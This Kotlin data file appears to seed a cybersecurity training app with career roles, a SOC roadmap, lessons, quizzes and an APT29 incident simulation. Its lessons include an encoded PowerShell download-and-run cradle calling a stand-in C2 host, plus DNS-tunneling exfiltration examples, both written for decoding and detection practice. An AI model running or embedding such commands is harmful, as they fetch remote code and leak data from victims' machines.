package com.example.data

import com.example.model.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID

object AegoraRepository {

  // Active User Profile State
  private val _userProfile = MutableStateFlow(
    UserProfile(
      id = "usr_aegora_01",
      name = "Alex Vance",
      callsign = "VANCE-SOC",
      email = "vance@cyber.aegora.net",
      targetCareerId = "soc_analyst",
      currentLevel = SkillLevel.BEGINNER,
      dailyCommitment = DailyCommitment.HOUR_1,
      targetTimeline = TargetTimeline.MONTH_6,
      learningPreference = LearningPreference.HANDS_ON,
      xp = 2850,
      currentStreak = 12,
      jobReadinessScore = 74,
      passportId = "AEG-2026-9942X",
      verifiedSkillCount = 14,
      completedLabsCount = 8,
      completedProjectsCount = 2,
      completedCtfsCount = 5,
      isOnboarded = true
    )
  )
  val userProfile: StateFlow<UserProfile> = _userProfile.asStateFlow()

  // Daily Mission State
  private val _dailyMission = MutableStateFlow(
    DailyMission(
      id = "msn_001",
      title = "Investigate Suspicious Encoded PowerShell",
      category = "SOC & Detection",
      difficulty = "Intermediate",
      estimatedTimeMinutes = 35,
      skillsTargeted = listOf("Windows Event Logs", "Sysmon Event ID 1", "MITRE T1059.001"),
      scenarioContext = "EDR triggered Alert #9042 on Host WIN-FINANCE-04: Base64 obfuscated process spawned by WINWORD.EXE with outbound TCP connection to 198.51.100.44:8443.",
      xpReward = 250,
      isCompleted = false
    )
  )
  val dailyMission: StateFlow<DailyMission> = _dailyMission.asStateFlow()

  // Career Roles Catalog
  val careerRoles: List<CareerRole> = listOf(
    CareerRole(
      id = "soc_analyst",
      title = "SOC Analyst (L1 / L2)",
      category = "Defensive Security",
      iconName = "Security",
      shortDesc = "Frontline defender monitoring SIEM alerts, triaging incident alerts, and mapping adversary attack chains.",
      fullDesc = "Security Operations Center (SOC) analysts are the critical frontline defense. You analyze live telemetry, investigate security anomalies, dissect phishing emails, contain compromised endpoints, and document root causes following NIST/SANS incident response lifecycles.",
      marketDemand = "Critical Shortage (+32% YoY)",
      averageSalarySample = "Sample Market Data: $82,000 - $125,000",
      primarySkills = listOf("SIEM & Log Triage", "MITRE ATT&CK", "Network Forensics", "Phishing Analysis", "Sysmon & EDR"),
      essentialTools = listOf("Wazuh", "Splunk", "Wireshark", "Sysmon", "TheHive", "YARA"),
      targetCerts = listOf("CompTIA Security+", "CompTIA CySA+", "BTL1 (Blue Team Level 1)", "SC-200 Microsoft SOC"),
      prerequisites = listOf("TCP/IP & Subnetting", "Linux CLI", "Windows Security Architecture"),
      matchPercentage = 78
    ),
    CareerRole(
      id = "pentester",
      title = "Penetration Tester / Red Team",
      category = "Offensive Security",
      iconName = "Terminal",
      shortDesc = "Ethical hacker evaluating network, web, and infrastructure vulnerabilities to harden enterprise defenses.",
      fullDesc = "Penetration testers simulate realistic adversary attacks in controlled environments to identify security flaws before malicious actors do. You perform recon, exploit misconfigurations, escalate privileges, and provide structured remediation blueprints to engineering teams.",
      marketDemand = "High Demand (+28% YoY)",
      averageSalarySample = "Sample Market Data: $105,000 - $160,000",
      primarySkills = listOf("Web App Pentesting", "Active Directory Attacks", "Privilege Escalation", "Network Exploitation", "Scripting & Automation"),
      essentialTools = listOf("Burp Suite Pro", "Nmap", "Metasploit", "BloodHound", "Impacket", "Gobuster"),
      targetCerts = listOf("eJPTv2", "OSCP (OffSec Certified)", "PNPT (TCM Security)", "CRTO"),
      prerequisites = listOf("OSI Model & Routing", "Web Technologies (HTTP/S, APIs)", "Python/Bash Scripting"),
      matchPercentage = 62
    ),
    CareerRole(
      id = "cloud_security",
      title = "Cloud Security Engineer",
      category = "Cloud Architecture",
      iconName = "Cloud",
      shortDesc = "Designs and secures AWS, Azure, and GCP architectures, IAM policies, and containerized microservices.",
      fullDesc = "Cloud Security Engineers secure multi-cloud infrastructures, automate guardrails, enforce least-privilege IAM, audit Terraform/CloudFormation templates, and respond to cloud-native breaches in serverless and Kubernetes environments.",
      marketDemand = "Extreme Demand (+41% YoY)",
      averageSalarySample = "Sample Market Data: $125,000 - $185,000",
      primarySkills = listOf("AWS/Azure IAM Governance", "CloudTrail & GuardDuty", "Kubernetes Hardening", "Terraform / IaC Security", "CSPM & CIEM"),
      essentialTools = listOf("AWS Security Hub", "Trivy", "Prowler", "Falco", "Checkov", "Terraform"),
      targetCerts = listOf("AWS Certified Security - Specialty", "AZ-500 Azure Security", "CCSK", "CKS (Kubernetes)"),
      prerequisites = listOf("Cloud Fundamentals", "Linux Administration", "Infrastructure as Code"),
      matchPercentage = 54
    ),
    CareerRole(
      id = "dfir_analyst",
      title = "DFIR (Digital Forensics & IR)",
      category = "Forensics & Response",
      iconName = "FindInPage",
      shortDesc = "Deep incident responder performing memory forensics, disk carving, and timeline reconstruction during breaches.",
      fullDesc = "Digital Forensics & Incident Response (DFIR) specialists step in during high-severity enterprise breaches. You extract volatile memory, carve disk images, reverse-engineer malware loaders, and reconstruct second-by-second attack timelines for legal and executive disclosure.",
      marketDemand = "Very High Demand (+30% YoY)",
      averageSalarySample = "Sample Market Data: $110,000 - $165,000",
      primarySkills = listOf("Volatility Memory Forensics", "Autopsy & Disk Imaging", "Prefetch & Shimcache Triage", "Malware Triage", "Chain of Custody"),
      essentialTools = listOf("Volatility 3", "FTK Imager", "Eric Zimmerman Tools", "KAPE", "Ghidra"),
      targetCerts = listOf("GIAC GCFE", "GIAC GCFA", "CHFI", "BTL2"),
      prerequisites = listOf("Windows Internals", "File Systems (NTFS/ext4)", "C / Assembly Basics"),
      matchPercentage = 58
    ),
    CareerRole(
      id = "appsec_engineer",
      title = "Application Security (AppSec)",
      category = "Software Defense",
      iconName = "Code",
      shortDesc = "Secures SDLC pipelines, performs SAST/DAST code reviews, and prevents OWASP Top 10 vulnerabilities.",
      fullDesc = "AppSec Engineers bridge software development and cybersecurity. You conduct threat modeling, embed automated security gates in CI/CD, conduct secure code reviews, and remediate OWASP Top 10 vulnerabilities across web and mobile ecosystems.",
      marketDemand = "High Demand (+35% YoY)",
      averageSalarySample = "Sample Market Data: $120,000 - $175,000",
      primarySkills = listOf("OWASP Top 10 Deep Dive", "Threat Modeling (STRIDE)", "SAST/DAST/SCA Tools", "Secure Code Review", "API Security"),
      essentialTools = listOf("SonarQube", "Snyk", "Semgrep", "Burp Suite", "OWASP ZAP", "Postman"),
      targetCerts = listOf("CSSLP", "GIAC GWEB", "CASE (Certified AppSec Engineer)"),
      prerequisites = listOf("Full-Stack Programming", "HTTP Protocol", "Git & CI/CD Pipelines"),
      matchPercentage = 66
    ),
    CareerRole(
      id = "threat_hunter",
      title = "Threat Hunter & Intel Analyst",
      category = "Proactive Defense",
      iconName = "Radar",
      shortDesc = "Proactively searches enterprise data lakes to discover stealthy adversaries that bypassed automated alerts.",
      fullDesc = "Threat Hunters do not wait for alarms. Using adversary intelligence, MITRE ATT&CK techniques, and hypothesis-driven behavioral queries, you interrogate SIEM data lakes to detect living-off-the-land techniques, beaconing C2, and silent insider threats.",
      marketDemand = "High Demand (+31% YoY)",
      averageSalarySample = "Sample Market Data: $115,000 - $160,000",
      primarySkills = listOf("Hypothesis-Driven Hunting", "KQL & SPL Advanced Queries", "YARA & Sigma Rules", "Adversary Emulation", "Threat Intel (STIX/TAXII)"),
      essentialTools = listOf("Splunk Enterprise", "Microsoft Sentinel", "MISP", "Atomic Red Team", "Velociraptor"),
      targetCerts = listOf("GIAC GCTI", "eCTHP (Threat Hunting)", "SANS SEC555"),
      prerequisites = listOf("MITRE Framework", "Log Architecture", "Python Data Analysis"),
      matchPercentage = 60
    ),
    CareerRole(
      id = "ai_security",
      title = "AI Security & LLM Red Teamer",
      category = "Emerging Tech",
      iconName = "Psychology",
      shortDesc = "Secures machine learning pipelines, audits LLM safety, prevents prompt injection, and model inversion attacks.",
      fullDesc = "AI Security specialists evaluate enterprise generative AI systems, protect neural network pipelines from poisoning and extraction, test model alignment, and implement OWASP Top 10 for LLM security controls.",
      marketDemand = "Explosive Growth (+65% YoY)",
      averageSalarySample = "Sample Market Data: $135,000 - $210,000",
      primarySkills = listOf("Prompt Injection Defense", "Training Data Poisoning", "Model Extraction & Inversion", "OWASP for LLMs", "AI Governance"),
      essentialTools = listOf("Garak", "PyRIT", "LangChain Guardrails", "NeMo Guardrails", "Jupyter"),
      targetCerts = listOf("Certified AI Security Professional (CAISP)", "MITRE ATLAS Practitioner"),
      prerequisites = listOf("Python & PyTorch/TensorFlow", "Cyber Fundamentals", "NLP & Transformers"),
      matchPercentage = 48
    )
  )

  // Dynamic Personalized Roadmap based on SOC Analyst
  private val _roadmapPhases = MutableStateFlow(
    listOf(
      RoadmapPhase(
        monthNumber = 1,
        title = "Foundation & Systems Telemetry",
        focusDomain = "Core Systems & Networking",
        description = "Master TCP/IP handshakes, DNS resolution mechanics, Linux triage commands, and Windows Security Event logs.",
        topics = listOf(
          RoadmapTopic("top_101", "TCP/IP Handshake & Packet Anatomy", "Networking", 6, isCompleted = true, isLocked = false, keyConcepts = listOf("SYN-ACK Handshake", "Wireshark PCAP Filter", "TCP Flags")),
          RoadmapTopic("top_102", "DNS Resolution, Poisoning & Tunneling", "Networking", 8, isCompleted = true, isLocked = false, keyConcepts = listOf("DNS Record Types", "Recursive Resolution", "Tunneling IOCs")),
          RoadmapTopic("top_103", "Linux CLI Forensics & /var/log Triage", "Linux", 10, isCompleted = true, isLocked = false, keyConcepts = listOf("auth.log", "auditd", "journalctl", "netstat/ss")),
          RoadmapTopic("top_104", "Windows Event IDs & Security Architecture", "Windows", 12, isCompleted = false, isLocked = false, keyConcepts = listOf("Event ID 4624/4625", "Event ID 4688", "NTLM vs Kerberos"))
        ),
        milestoneProject = "Build an Automated Linux Log Triage Script (Python/Bash)",
        isCompleted = false,
        isCurrent = true
      ),
      RoadmapPhase(
        monthNumber = 2,
        title = "SIEM Operations, Sysmon & Wazuh",
        focusDomain = "Detection & Log Aggregation",
        description = "Deploy endpoint telemetry agents, configure centralized SIEM ingestion pipelines, and write custom detection rules.",
        topics = listOf(
          RoadmapTopic("top_201", "Sysmon Deployment & Event ID Mapping", "Telemetry", 10, isCompleted = false, isLocked = false, keyConcepts = listOf("Event ID 1 (Process)", "Event ID 3 (Network)", "Event ID 7 (DLL)")),
          RoadmapTopic("top_202", "Wazuh SIEM Ingestion & Decoder Rules", "SIEM", 14, isCompleted = false, isLocked = false, keyConcepts = listOf("XML Decoders", "Alert Thresholds", "Agent Grouping")),
          RoadmapTopic("top_203", "Splunk SPL Fundamentals & Query Optimization", "SIEM", 12, isCompleted = false, isLocked = false, keyConcepts = listOf("stats / eval", "transaction queries", "Table visualization")),
          RoadmapTopic("top_204", "Sigma Generic Detection Rules Engine", "Detections", 8, isCompleted = false, isLocked = false, keyConcepts = listOf("Sigma YAML format", "Logsource mapping", "Sigmac converter"))
        ),
        milestoneProject = "Mini Enterprise SOC Lab: Ingesting 3 VMs into Wazuh + Sysmon",
        isCompleted = false,
        isCurrent = false
      ),
      RoadmapPhase(
        monthNumber = 3,
        title = "MITRE ATT&CK & Threat Intelligence",
        focusDomain = "Adversary Tactics & Techniques",
        description = "Deconstruct adversary lifecycles, leverage Cyber Kill Chain and MITRE ATT&CK matrix, and consume threat intelligence feeds.",
        topics = listOf(
          RoadmapTopic("top_301", "MITRE ATT&CK Enterprise Matrix Navigation", "Threat Intel", 8, isCompleted = false, isLocked = true, keyConcepts = listOf("Tactics vs Techniques", "Sub-techniques", "Mitigations")),
          RoadmapTopic("top_302", "YARA Rules for Malware Hunting", "Malware Triage", 10, isCompleted = false, isLocked = true, keyConcepts = listOf("Strings condition", "Hex regex", "Byte matching")),
          RoadmapTopic("top_303", "STIX/TAXII Threat Feed Integration", "Threat Intel", 6, isCompleted = false, isLocked = true, keyConcepts = listOf("IOC ingestion", "Confidence scoring", "MISP sharing"))
        ),
        milestoneProject = "Publish a Threat Advisory & Detection Rule Pack on GitHub",
        isCompleted = false,
        isCurrent = false
      ),
      RoadmapPhase(
        monthNumber = 4,
        title = "Incident Response & Incident Playbooks",
        focusDomain = "Active Incident Handling",
        description = "Execute containment, eradication, and post-incident analysis for business email compromise, malware, and credential theft.",
        topics = listOf(
          RoadmapTopic("top_401", "Phishing Header Analysis & IOC Extraction", "Incident Response", 8, isCompleted = false, isLocked = true, keyConcepts = listOf("SPF/DKIM/DMARC", "Original Email Headers", "Sandbox detonating")),
          RoadmapTopic("top_402", "Kerberoasting & Pass-the-Hash Detection", "Identity Defense", 10, isCompleted = false, isLocked = true, keyConcepts = listOf("SPN requests", "RC4 encryption downgrade", "Event 4769")),
          RoadmapTopic("top_403", "Endpoint Containment & Memory Dumping", "DFIR", 12, isCompleted = false, isLocked = true, keyConcepts = listOf("Network isolation", "WinPmem capture", "Volatility pslist"))
        ),
        milestoneProject = "Full Incident Report: Reconstructing an APT29 FinTech Breach",
        isCompleted = false,
        isCurrent = false
      ),
      RoadmapPhase(
        monthNumber = 5,
        title = "Proactive Threat Hunting & Purple Teaming",
        focusDomain = "Hypothesis-Driven Hunting",
        description = "Emulate adversary actions with Atomic Red Team and hunt for stealthy persistence and lateral movement.",
        topics = listOf(
          RoadmapTopic("top_501", "Hypothesis-Driven Threat Hunting in SIEM", "Hunting", 12, isCompleted = false, isLocked = true, keyConcepts = listOf("Baselines & Anomalies", "Parent-Child process anomalies", "Beaconing frequency")),
          RoadmapTopic("top_502", "Atomic Red Team Adversary Emulation", "Purple Team", 10, isCompleted = false, isLocked = true, keyConcepts = listOf("Automated test harnesses", "Validation of SIEM alerts", "Detection gaps"))
        ),
        milestoneProject = "Custom Atomic Red Team Testing Matrix & Gap Analysis",
        isCompleted = false,
        isCurrent = false
      ),
      RoadmapPhase(
        monthNumber = 6,
        title = "Skill Passport, Certification & Job Readiness",
        focusDomain = "Professional Launch",
        description = "Compile verified cryptographic skill passport, complete mock technical interviews, and polish GitHub project portfolio.",
        topics = listOf(
          RoadmapTopic("top_601", "CompTIA CySA+ / BTL1 Exam Drills", "Certification", 14, isCompleted = false, isLocked = true, keyConcepts = listOf("Scenario questions", "Log interpretation", "Incident playbook decisions")),
          RoadmapTopic("top_602", "SOC L1 Technical & Scenario Mock Interviews", "Interview Prep", 10, isCompleted = false, isLocked = true, keyConcepts = listOf("Incident communication", "Root-cause reasoning", "Calm triage posture"))
        ),
        milestoneProject = "Publish Aegora Skill Passport & Verified SOC Portfolio",
        isCompleted = false,
        isCurrent = false
      )
    )
  )
  val roadmapPhases: StateFlow<List<RoadmapPhase>> = _roadmapPhases.asStateFlow()

  // Verified Skill Evidence & Cyber Skill DNA
  val skillDomains: List<SkillDomain> = listOf(
    SkillDomain(
      id = "dom_def",
      name = "Defensive Security & SOC",
      icon = "Shield",
      masteryPercent = 76,
      skills = listOf(
        CyberSkill(
          id = "sk_siem",
          name = "SIEM & Log Analysis",
          domain = "Defensive",
          knowledgeScore = 84,
          practicalScore = 78,
          investigationScore = 72,
          overallMastery = 78,
          verifiedEvidenceList = listOf(
            SkillEvidence("ev_01", "SIEM & Log Analysis", "Lab Verification", "Sysmon Event ID 1 & 3 Triage Lab", "2026-08-20", "SHA256:7f4a...91bc", "96% Accuracy"),
            SkillEvidence("ev_02", "SIEM & Log Analysis", "Project Build", "Deployed 3-Node Wazuh Cluster", "2026-08-14", "SHA256:8b12...44fa", "Verified Working")
          ),
          recommendedNextAction = "Complete Suspicious PowerShell Investigation Scenario"
        ),
        CyberSkill(
          id = "sk_ir",
          name = "Incident Response (NIST)",
          domain = "Defensive",
          knowledgeScore = 80,
          practicalScore = 70,
          investigationScore = 75,
          overallMastery = 75,
          verifiedEvidenceList = listOf(
            SkillEvidence("ev_03", "Incident Response", "Incident Simulation", "Phishing to Ransomware Containment", "2026-08-18", "SHA256:3a91...112e", "Completed in 28 mins")
          ),
          recommendedNextAction = "Practice Memory Extraction in Volatility 3"
        ),
        CyberSkill(
          id = "sk_mitre",
          name = "MITRE ATT&CK Mapping",
          domain = "Defensive",
          knowledgeScore = 88,
          practicalScore = 82,
          investigationScore = 85,
          overallMastery = 85,
          verifiedEvidenceList = listOf(
            SkillEvidence("ev_04", "MITRE ATT&CK Mapping", "Quiz Verification", "Mapped 12 APT29 Attack Vectors", "2026-08-22", "SHA256:e410...099a", "100% Score")
          ),
          recommendedNextAction = "Explore Living-off-the-Land Binaries (LOLBAS) Techniques"
        )
      )
    ),
    SkillDomain(
      id = "dom_net",
      name = "Network & Infrastructure",
      icon = "Router",
      masteryPercent = 82,
      skills = listOf(
        CyberSkill(
          id = "sk_pcap",
          name = "Packet Analysis & Wireshark",
          domain = "Network",
          knowledgeScore = 88,
          practicalScore = 86,
          investigationScore = 80,
          overallMastery = 85,
          verifiedEvidenceList = listOf(
            SkillEvidence("ev_05", "Packet Analysis", "CTF Flag Capture", "Decrypted TLS in Enterprise PCAP", "2026-08-19", "SHA256:4a01...aa33", "Flag: aegora{tls_master_secret}")
          ),
          recommendedNextAction = "Analyze DNS Tunneling Beacon Patterns"
        ),
        CyberSkill(
          id = "sk_linux",
          name = "Linux Forensics & Hardening",
          domain = "Network",
          knowledgeScore = 82,
          practicalScore = 76,
          investigationScore = 78,
          overallMastery = 79,
          verifiedEvidenceList = listOf(
            SkillEvidence("ev_06", "Linux Forensics", "Lab Verification", "Investigated Sudoers Privilege Escalation", "2026-08-10", "SHA256:91b2...7710", "Root Cause Identified")
          ),
          recommendedNextAction = "Configure auditd Security Rules for /etc/passwd"
        )
      )
    ),
    SkillDomain(
      id = "dom_off",
      name = "Offensive & Vulnerability Assessment",
      icon = "Terminal",
      masteryPercent = 58,
      skills = listOf(
        CyberSkill(
          id = "sk_websec",
          name = "Web Application Security (OWASP)",
          domain = "Offensive",
          knowledgeScore = 74,
          practicalScore = 60,
          investigationScore = 55,
          overallMastery = 63,
          verifiedEvidenceList = listOf(
            SkillEvidence("ev_07", "Web Application Security", "Lab Verification", "Union-Based SQL Injection Bypass", "2026-08-08", "SHA256:12bc...3399", "Schema Dumped & Patched")
          ),
          recommendedNextAction = "Practice JWT Signature Confusion Vulnerabilities"
        ),
        CyberSkill(
          id = "sk_ad",
          name = "Active Directory Security",
          domain = "Offensive",
          knowledgeScore = 65,
          practicalScore = 48,
          investigationScore = 50,
          overallMastery = 54,
          verifiedEvidenceList = emptyList(),
          recurringMistakes = listOf("Confused Kerberos TGT with Service Ticket (TGS) in Wireshark"),
          recommendedNextAction = "Complete Kerberoasting Attack & Detection Lab"
        )
      )
    ),
    SkillDomain(
      id = "dom_cld",
      name = "Cloud & Container Security",
      icon = "Cloud",
      masteryPercent = 52,
      skills = listOf(
        CyberSkill(
          id = "sk_aws_iam",
          name = "Cloud IAM & CloudTrail Triage",
          domain = "Cloud",
          knowledgeScore = 68,
          practicalScore = 50,
          investigationScore = 52,
          overallMastery = 57,
          verifiedEvidenceList = listOf(
            SkillEvidence("ev_08", "Cloud IAM", "Lab Verification", "Detected Unauthorized S3 Bucket Policy Change", "2026-08-12", "SHA256:cc90...81aa", "Reverted Policy & Alerted")
          ),
          recommendedNextAction = "Audit AWS STS AssumeRole privilege escalation paths"
        )
      )
    )
  )

  // Real-world Lessons
  val sampleLessons: List<LessonContent> = listOf(
    LessonContent(
      id = "les_101",
      title = "DNS Resolution, Poisoning & Tunneling Mechanics",
      moduleTitle = "Core Systems & Networking Telemetry",
      estimatedReadMinutes = 8,
      coreExplanation = """
        The Domain Name System (DNS) maps human-readable domains (e.g. aegora.network) to machine routable IP addresses. Understanding DNS at a packet level is essential for every cyber defender because over 85% of modern malware leverages DNS for Command-and-Control (C2) communication and data exfiltration.
        
        When a client requests a record, it queries its local resolver, which traverses Root (.) → TLD (.net) → Authoritative Name Servers. In DNS Cache Poisoning, an attacker injects fraudulent IP mappings into a vulnerable resolver by spoofing UDP responses before legitimate replies arrive, redirecting legitimate users to malicious infrastructure.
        
        In DNS Tunneling, an attacker encodes arbitrary data inside subdomains of a controlled domain (e.g., `BASE64DATA.attacker-c2.com`). Since port 53 outbound is rarely blocked, the resolver unwittingly relays the stolen data straight to the adversary's authoritative server.
      """.trimIndent(),
      simplifiedAnalogy = "Think of DNS like a global phonebook. DNS poisoning is like a thief sneaking into the telephone exchange and swapping the bank's phone number with their own. DNS tunneling is like sending secret Morse code letters inside the recipient name of ordinary envelopes so airport security doesn't inspect them.",
      deepDiveTechnical = """
        Detection Engineering Indicators for DNS Tunneling:
        1. High Shannon Entropy in Query Names: Legitimate domains have low entropy (e.g., `google.com` ~ 2.4 bits). Tunneling subdomains contain random Base32/Base64 characters resulting in entropy > 3.8 bits.
        2. Abnormal Query Lengths: Standard DNS queries average 15-25 bytes. Tunneling queries frequently push the 253-character FQDN limit (e.g., labels of 63 octets).
        3. High Volume of TXT / NULL / CNAME record requests to a single unusual root domain within a 60-second window.
        
        Sysmon Event ID 22 (DNSEvent) records:
        - Image: Full executable path initiating query
        - QueryName: Requested domain
        - QueryResults: Resolved IP addresses
      """.trimIndent(),
      codeOrTerminalSnippet = """
# Inspecting DNS Tunneling query entropy in Wireshark / TShark
tshark -r incident_capture.pcap -Y "dns.flags.response == 0" -T fields -e frame.time -e ip.src -e dns.qry.name | head -n 8

# Output:
# 2026-08-25 09:31:02  192.168.1.105  aW5maWx0cmF0aW9uX3Rva2VuXzAx.c2-exfil.net
# 2026-08-25 09:31:04  192.168.1.105  cGFzc3dvcmRfaGFzaF9hZG1pbg==.c2-exfil.net
# 2026-08-25 09:31:07  192.168.1.105  a2V5X2V4Y2hhbmdlX3NpZzAy.c2-exfil.net
      """.trimIndent(),
      keyTakeaways = listOf(
        "DNS uses UDP port 53; cache poisoning exploits predictable Transaction IDs (TXID) and source ports.",
        "DNS Tunneling abuses recursive resolvers to exfiltrate data via base-encoded subdomains.",
        "Detect tunneling by tracking high Shannon entropy (>3.8), long subdomain labels (up to 63 bytes), and anomalous TXT record volumes."
      ),
      practicalTaskDescription = "Inspect the provided sample Wireshark stream and isolate the base64 string being tunneled to c2-exfil.net.",
      spacedRepetitionDue = false
    ),
    LessonContent(
      id = "les_102",
      title = "Sysmon Event ID 1 & PowerShell Deobfuscation",
      moduleTitle = "SIEM & Host Endpoint Telemetry",
      estimatedReadMinutes = 10,
      coreExplanation = """
        Microsoft Sysinternals System Monitor (Sysmon) provides unmatched granular visibility into Windows endpoints. Unlike standard Windows Security Event 4688, Sysmon Event ID 1 (Process Creation) logs:
        - ParentImage & ParentCommandLine (e.g. Did Word spawn PowerShell?)
        - CommandLine (Full parameters executed)
        - Hashes (SHA256, MD5, IMPHASH of the binary)
        - User & LogonId
        - IntegrityLevel
        
        Adversaries frequently use encoded PowerShell commands (`powershell.exe -enc <Base64>`) to evade string-based perimeter scanners. A SOC analyst must decode these payloads, identify living-off-the-land techniques (LOLBAS), and correlate them with network events (Sysmon Event ID 3).
      """.trimIndent(),
      simplifiedAnalogy = "If Windows Event 4688 is like seeing a receipt that says 'Item purchased', Sysmon Event 1 is like a high-definition security camera video showing exactly who bought it, what cashier gave it to them, what bag they put it in, and the barcode stamp.",
      deepDiveTechnical = """
        Decoding Encoded PowerShell:
        PowerShell `-EncodedCommand` expects UTF-16LE (Unicode) encoding, NOT ASCII.
        In CyberChef or Linux CLI:
        `echo "<BASE64>" | base64 -d | iconv -f UTF-16LE -t UTF-8`
        
        Common Malicious Switches:
        - `-nop` / `-NoProfile`: Skips loading user scripts
        - `-w hidden` / `-WindowStyle Hidden`: Prevents terminal window popping up for user
        - `-enc` / `-EncodedCommand`: Base64 UTF-16LE input
        - `IEX (New-Object Net.WebClient).DownloadString()`: Memory-only script execution
      """.trimIndent(),
      codeOrTerminalSnippet = """
# Linux Bash decode of PowerShell UTF-16LE encoded payload:
echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQANAA6ADgANAA0ADMALwBzAHQAYQBnAGUAcgAuAHAAcwAxACcAKQA=" | base64 -d | iconv -f UTF-16LE -t UTF-8

# Output:
# IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.44:8443/stager.ps1')
      """.trimIndent(),
      keyTakeaways = listOf(
        "Sysmon Event ID 1 captures parent process lineage and cryptographic process hashes.",
        "Parent-child relationships like WINWORD.EXE spawning powershell.exe or cmd.exe represent strong indicators of compromise (T1059.001).",
        "PowerShell encoded commands require UTF-16LE decoding to reveal the plain-text malicious logic."
      ),
      practicalTaskDescription = "Decode the suspect payload from today's mission and extract the C2 IP address and downloaded script name.",
      spacedRepetitionDue = true
    )
  )
  val lessons: List<LessonContent> get() = sampleLessons

  // Interactive Quizzes with Real Scenarios
  val sampleQuizzes: List<QuizQuestion> = listOf(
    QuizQuestion(
      id = "qz_01",
      questionText = "An EDR alert shows WINWORD.EXE spawned POWERSHELL.EXE with the flag '-EncodedCommand'. Which MITRE ATT&CK technique best classifies this behavior?",
      scenarioContext = "Host: WORKSTATION-72. User: accountant_02. Parent Process: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE. Child: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.",
      logSnippet = "Sysmon ID: 1 | ParentImage: WINWORD.EXE | Image: powershell.exe | CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgA...",
      mitreTechnique = "T1059.001 (Command and Scripting Interpreter: PowerShell)",
      options = listOf(
        "T1059.001 - Command and Scripting Interpreter: PowerShell (Spawned via Phishing Document)",
        "T1053 - Scheduled Task/Job Execution",
        "T1078 - Valid Accounts Login",
        "T1566.002 - Spearphishing Link Only"
      ),
      correctOptionIndex = 0,
      detailedExplanation = "When a macro or exploit inside Microsoft Word executes a shell, it spawns a child scripting engine. This is a classic execution technique categorized under MITRE T1059.001, typically delivered via Phishing Attachment (T1566.001)."
    ),
    QuizQuestion(
      id = "qz_02",
      questionText = "When investigating potential DNS Tunneling, which quantitative metric is the strongest indicator of encoded payload transmission?",
      scenarioContext = "SIEM receives 12,000 DNS queries in 5 minutes targeting random subdomains of `updates-sync-cdn.net`.",
      logSnippet = "QueryName: 7xK9mP2vL0qW8zR4tY1uI3oE5a...updates-sync-cdn.net | QueryType: TXT | Response: 64 bytes",
      mitreTechnique = "T1071.004 (Application Layer Protocol: DNS)",
      options = listOf(
        "Standard round-trip latency below 5ms",
        "High Shannon Entropy (>3.8 bits) combined with long subdomain label lengths (>50 characters)",
        "Target domain ending in .com rather than .org",
        "Queries using TCP port 80 instead of UDP 53"
      ),
      correctOptionIndex = 1,
      detailedExplanation = "Legitimate hostnames adhere to readable language syllables with lower entropy (~2.2 - 2.8). Base64 or encrypted tunneling fragments exhibit high mathematical entropy (>3.8) and consume maximum allowable label lengths."
    )
  )

  // Incident Simulations
  val incidentSimulations: List<IncidentSimulation> = listOf(
    IncidentSimulation(
      id = "sim_apt29_fintech",
      title = "FinTech Breach: APT29 Cozy Bear Credential & Exfiltration Incident",
      targetOrg = "Apex Capital FinTech (1,200 Employees)",
      threatActor = "APT29 (Nobelium / Cozy Bear)",
      scenarioBrief = "At 09:31 UTC, an invoice phishing email bypassed perimeter filters. At 09:34, an endpoint executed a macro, followed by LSASS memory dumping, lateral movement over SMB, and S3 bucket exfiltration.",
      initialAlert = "SOC Alert #1104: Suricata detected Cobalt Strike Beaconing User-Agent to 198.51.100.44:8443 from FINANCE-WK-03.",
      logs = listOf(
        LogEvent("09:31:14", "Email Gateway", "MSG_DELIVER", "INFO", "Email from 'billing@apex-invoices.com' delivered to sarah.fin@apex.com with attachment 'Invoice_Q3.docm'", false),
        LogEvent("09:34:02", "Sysmon EDR", "Event ID 1", "CRITICAL", "WINWORD.EXE (PID 4412) spawned powershell.exe (PID 5820) with -EncodedCommand SQBFAFgA...", true),
        LogEvent("09:37:45", "Sysmon EDR", "Event ID 10", "HIGH", "powershell.exe (PID 5820) requested PROCESS_ALL_ACCESS to lsass.exe (PID 672)", true),
        LogEvent("09:42:10", "Domain Controller", "Event ID 4624", "HIGH", "Successful Network Logon (Type 3) to DC-01 from 192.168.10.45 using compromised user 'svc_backup'", true),
        LogEvent("09:51:30", "Firewall / Proxy", "FW_DENY", "MEDIUM", "Outbound connection attempt to known malicious C2 198.51.100.44 on port 8443", true)
      ),
      evidenceNodes = listOf(
        EvidenceNode("evn_1", "198.51.100.44:8443", "IP", "Adversary C2 Server in Netherlands ASN"),
        EvidenceNode("evn_2", "Invoice_Q3.docm", "MALWARE", "VBA Macro dropper weaponized with shellcode"),
        EvidenceNode("evn_3", "svc_backup", "ACCOUNT", "Compromised Service Account with Domain Admin rights"),
        EvidenceNode("evn_4", "FINANCE-WK-03 (192.168.10.45)", "PROCESS", "Initial Patient Zero Compromised Endpoint"),
        EvidenceNode("evn_5", "DC-01 (192.168.10.2)", "PROCESS", "Target Domain Controller accessed via Pass-the-Hash")
      ),
      containmentOptions = listOf(
        "Immediately isolate FINANCE-WK-03 from network, revoke svc_backup Kerberos tickets, and block 198.51.100.44 on border firewalls.",
        "Reboot the Domain Controller to terminate active sessions.",
        "Email all employees asking if they clicked the invoice.",
        "Delete the file Invoice_Q3.docm from Sarah's Desktop and close the ticket."
      ),
      correctContainmentIndex = 0,
      mitreMapping = "T1566.001 (Spearphishing Attachment) → T1059.001 (PowerShell) → T1003.001 (LSASS Dumping) → T1021.002 (SMB/Windows Admin Shares)",
      learningOutcome = "Demonstrates full SOC triage, IOC correlation across email, endpoint, and network telemetry, followed by effective containment according to NIST SP 800-61."
    )
  )

  // Real-world CTF Challenges
